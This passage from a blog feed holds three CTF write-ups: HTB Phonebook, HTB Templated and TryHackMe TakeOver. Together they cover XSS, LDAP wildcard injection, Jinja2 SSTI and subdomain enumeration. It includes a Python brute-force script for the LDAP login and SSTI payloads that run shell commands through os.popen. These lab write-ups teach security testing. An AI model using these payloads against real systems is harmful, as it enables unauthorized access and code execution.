<p id="863c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom msg--highlight msg--info dropcap" data-selectable-paragraph=""><span class="l aon aoo aop bn aoq aor aos aot aou dj">C</span>HALLENGE DESCRIPTION</p>
<p id="8ba0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Who is lucky enough to be included in the phonebook?</p>
<p id="2207" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In the beginning, we first visit the web page and got a login page :))</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aoz">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*JmP-Ml1In7SYMYpTEE_8zw.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="420" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="4369" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The Web app asks us to log in to the application. But we don’t have any credentials, but we have a text on the homepage where it says<br><code class="ff abm abn abo abp b">New (9.8.2020): You can now login using the workstation username and password! - Reese</code></p>
<p id="abca" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">I take a dummy logging attempt as username: admin &amp;&amp; password: admin. It shows the authentication field::(</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km apa">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*chVw2sr0W9J4ccnpcg4J1g.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="353" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="9d74" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">But if you check the URL then you see there is a parameter :) And we can attempt an XSS attack through it. Is it possible? yes.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km apb">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*sjyYQXlNohLiT8h-gecV9g.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="290" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="d641" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After viewing the source code of the webpage, I guess there might be a DOM-based XSS vulnerability. So, let’s try.</p>
<p id="f898" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong>XSS Payload:</strong></p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="690e" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">http://206.189.121.131:30184/login?message=&lt;img src=<span class="hljs-string">'x'</span> onerror=<span class="hljs-string">'alert(1)'</span>&gt;</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aod">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*3cBlTfL1VGWggqFV69xnZg.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="367" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="d84f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Do you see? Here DOM-based XSS worked !!! But alas! this is not the way we can solve the challenge :((</p>
<p id="3a4c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In the login field, if you use “<strong class="ly kz">*</strong>” for both the username and password field then it automatically bypassed the authentication :)</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aod">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*fd8sbyY2KodIQ4-quvKPYg.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="190" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<blockquote class="abq abr abs">
<p id="de86" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">This gives us a hint that it is probably using <a class="af rn" href="https://searchmobilecomputing.techtarget.com/definition/LDAP" rel="noopener ugc nofollow" target="_blank">LDAP</a> authentication.</p>
</blockquote>
<p id="23b0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we are going to try character brute-force (LDAP Injection) using Python script.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="cdc9" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>headers = {<span class="hljs-string">"UserAgent"</span> : <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"</span>}<br>url = <span class="hljs-string">"http://167.99.84.37:32125/login"</span><br><br>chars = string.ascii_letters<br>chars += <span class="hljs-string">''</span>.join([<span class="hljs-string">'0'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'~'</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">'@'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">'_'</span>, <span class="hljs-string">"'"</span>])<br><br>counter = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">"HTB{"</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># if all chars are not correct means we previous already found the flag</span><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-built_in">len</span>(chars):<br>        <span class="hljs-built_in">print</span>(flag + <span class="hljs-string">"}"</span>)<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># creates something like HTB{a*}</span><br>    password = flag + chars[counter] + <span class="hljs-string">"*}"</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Trying: "</span> + password)<br><br>    data = {<span class="hljs-string">"username"</span> : <span class="hljs-string">"Reese"</span>, <span class="hljs-string">"password"</span> : password}<br>    response = requests.post(url, headers=headers, data=data)<br>    <br>    <span class="hljs-keyword">if</span> (response.url != url + <span class="hljs-string">"?message=Authentication%20failed"</span>):<br>        <span class="hljs-comment"># possible flag since we still using * at the end: e.g HTB{abc_*}.</span><br>        <span class="hljs-comment"># append chars[] so that we not need to deal with removing "*}" as compared to if we assign password variable to flag variable</span><br>        flag += chars[counter]<br>        counter = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># increment the char since we might not have found the right letter</span><br>        counter += <span class="hljs-number">1</span></span></pre>
<p id="9132" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Once we iterated all the letters and the result still fails, it means that the latest password/flag entered <strong class="ly kz">without </strong>the asterisk (*) is the flag.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*SqUTjKBmeNorLcV9O6Llmw.png" alt="Phonebook — HTB Web Challenge Writeup" width="700" height="382" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="4f95" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hurrah!!! we got the flag that we are seeking :))</p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Templated — HTB Web Challenge Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" medium="image" />
            <category term="Web Security"/>
            <category term="Pentesting"/>
            <category term="HackTheBox"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-07T10:47:34+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" alt="Templated — HTB Web Challenge Writeup" />
                    CHALLENGE DESCRIPTION First Start Instance and then you are provided with an web address in the form of &lt;ip&gt;:&lt;port&gt;. Copy it and open it in another tab or&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/7/Templated-lg.jpg" class="type:primaryImage" alt="Templated — HTB Web Challenge Writeup" /></p>
                <p id="7abf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom dropcap" data-selectable-paragraph=""><span class="l aon aoo aop bn aoq aor aos aot aou dj">C</span>HALLENGE DESCRIPTION</p>
<h2 id="8d9c" class="ze zf tu be zg la zh do ld le zi dq lh li zj lj lm ln zk lo lr ls zl lt lw zm bj" data-selectable-paragraph="">Can you exploit this simple mistake?</h2>
<p id="e467" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">First Start Instance and then you are provided with an <code class="ff abm abn abo abp b">web address</code> in the form of <code class="ff abm abn abo abp b">&lt;ip&gt;:&lt;port&gt;</code>. Copy it and open it in another tab or browser. In my case it was <a class="af rn" href="http://134.209.18.1:30563/" rel="noopener ugc nofollow" target="_blank">http://134.209.18.1:30563</a></p>
<p id="eea7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now let’s visit the webpage:</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aov">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*1LXjZNafDz94euePR9ZFnw.png" alt="HTB Web Challenge Templated writeup" width="700" height="300" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="0d94" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The web app shows a message <code class="ff abm abn abo abp b">Site still under construction</code><br><code class="ff abm abn abo abp b">Proudly powered by Flask/Jinja2</code></p>
<p id="3097" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">There is a hint do you notice? Yeah, you notice… Here the web app technology is Flask/Jinja2. (It is a hint for us.)</p>
<p id="8025" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If you search for <strong class="ly kz">Flask/Jinja2 exploit</strong> then you can find it has SSTI (Server Side Template Injection)</p>
<p id="b122" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We can indicate possible SSTI by adding <strong class="ly kz"><em class="abt">{{ 5* 5 }}</em></strong> to the parameter search, we can see that the template engine evaluates the mathematical expression and the application responds with <strong class="ly kz"><em class="abt">25</em></strong>.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aov">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*xko-JwNVbZLFqyi9rFhlTg.png" alt="" width="700" height="300" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<h3 id="f449" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Now we are going to exploit this using SSTI</h3>
<p id="3fc5" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Use the bellow payloads to begin our exploitation to get the flag!</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0d2a" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'id'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aov">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*AijyueE1MzBurK9MK3tGhA.png" alt="HTB Web Challenge Templated Writeup" width="700" height="177" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="3709" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'ls'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aow">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*1Dnd-7JeY7Z2ODWjTWceqA.png" alt="HTB Web Challenge Templated" width="700" height="148" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="52d1" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'cat flag.txt'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aox">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*pefVP-Tw4pCXwTM85ByqXw.png" alt="" width="700" height="177" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="9bf3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hurrah!!! We found the flag. This is where our challenge finished :))</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>TakeOver TryHackMe Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver-TryHackMe-Writeup.jpg" medium="image" />
            <category term="Web Security"/>
            <category term="TryHackMe"/>
            <category term="Subdomain Recon"/>
            <category term="Pentesting"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-07T10:44:15+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver-TryHackMe-Writeup.jpg" alt="TakeOver TryHackMe Writeup" />
                    Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver-TryHackMe-Writeup.jpg" class="type:primaryImage" alt="TakeOver TryHackMe Writeup" /></p>
                <p id="4842" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can takeover.</p>
<p id="e010" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our website is located at <a class="af rn" href="https://futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://futurevera.thm</a></p>
<p id="649a" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
<p id="c20c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges: </strong><span class="ly kz">Sub-Domain Enumeration, Sub-Domain Takeover.</span></p>
<p id="34a2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af rn" href="https://tryhackme.com/room/takeover" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/takeover</a></p>
<p id="1425" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The beginning starts the machine and grub the IP. Then add the $IP in /etc/hosts for futurevera.thm Use the bellow command to do that.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8522" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo <span class="hljs-built_in">echo</span> &lt;THM-IP&gt; futurevera.thm &gt;&gt; /etc/hosts</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aod">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*n44zCgJjwvbYIVVUdsl1xg.png" alt="TakeOver TryHackMe Writeup" width="700" height="380" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="b88e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">First, visit the website and let check what’s there…</p>
<p id="9134" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, there is nothing interesting. I tried Rustscan to check the open port but found nothing and there is nothing in the source code.</p>
<p id="1a45" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we begin our subdomain enumeration stuff. For that, I’m using the Gobuster tool.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ff0d" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">gobuster vhost -u futurevera.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aoe">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*4rVn0_XVfST7JccOW3N2Bg.png" alt="TakeOver TryHackMe Writeup" width="700" height="228" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="2364" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Here we got “<a class="af rn" href="http://portal.futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://portal.futurevera.thm</a>” as a subdomain.</p>
<p id="5814" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Before access add that on /etc/hosts then visit that subdomain.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="f461" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo <span class="hljs-built_in">echo</span> &lt;THM-IP&gt; portal.futurevera.thm &gt;&gt; /etc/hosts</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aof">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*lYTeEEwUR38XwA_q-a5DSQ.png" alt="TakeOver TryHackMe Writeup" width="700" height="184" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="6a40" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">But we can’t access the site cause it’s a privet or internal subdomain.</p>
<p id="caac" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If you read the description carefully then you notice that they write blogs and they are rebuilding their support. Umm… There might be <a class="af rn" href="https://blog.futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://blog.futurevera.thm</a> and <a class="af rn" href="https://suport.futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://support.futurevera.thm</a> subdomains.</p>
<p id="117f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, let’s check this.</p>
<p id="499d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">A blog….</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aog">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*rBtfCqbxtAvOZquwfK-tlg.png" alt="TakeOver TryHackMe Writeup" width="700" height="380" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="5576" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">And suport website!!!!</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aog">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*WNlYhbHn-GV1p8U9aQLyMg.png" alt="TakeOver TryHackMe Writeup" width="700" height="380" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="9479" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Actually, I tried DNS enumeration but didn’t get any record except A record.</p>
<p id="f5f3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, I checked all these subdomains' SSL Certificates. In <a class="af rn" href="https://suport.futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://support.futurevera.thm</a> subdomains Certificates there is an alternative DNS record :)</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aog">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*Vyv_P5mEdd-S-S0543o1jg.png" alt="TakeOver TryHackMe Writeup" width="700" height="380" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="b684" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now add that on /etc/hosts then visit that subdomain.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="fa43" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo <span class="hljs-built_in">echo</span> &lt;THM-IP&gt; secrethelpdesk934752.support.futurevera.thm &gt;&gt; /etc/hosts</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aog">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*Xgi-Xx5lhvpSAF_4IhP-nw.png" alt="TakeOver TryHackMe Writeup" width="700" height="380" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="58f0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It actually shows the main website here… What if we remove ‘https//’ and add ‘http://’ before the subdomain? Let's check.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aoh">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*CKfRMokQdBz3wABQhfYfmg.png" alt="TakeOver TryHackMe Writeup" width="700" height="122" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="1f87" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bang we got our flag….!!!!!!! :)</p>
<h4 id="e233" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Actually what happened here and What is a subdomain takeover?</h4>
<p id="6369" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em><span class="tu">Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.</span></em></p>
<p id="5eca" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong>You can read more about subdomain takeovers here:</strong></p>
<ul>
<li id="fb78" class="xw xx tu ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp acj ack acl bj" data-selectable-paragraph=""><a class="af rn" href="https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/" rel="noopener ugc nofollow" target="_blank">https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/</a></li>
<li id="ee0b" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph=""><a class="af rn" href="https://www.hackerone.com/blog/Guide-Subdomain-Takeovers" rel="noopener ugc nofollow" target="_blank">https://www.hackerone.com/blog/Guide-Subdomain-Takeovers</a></li>
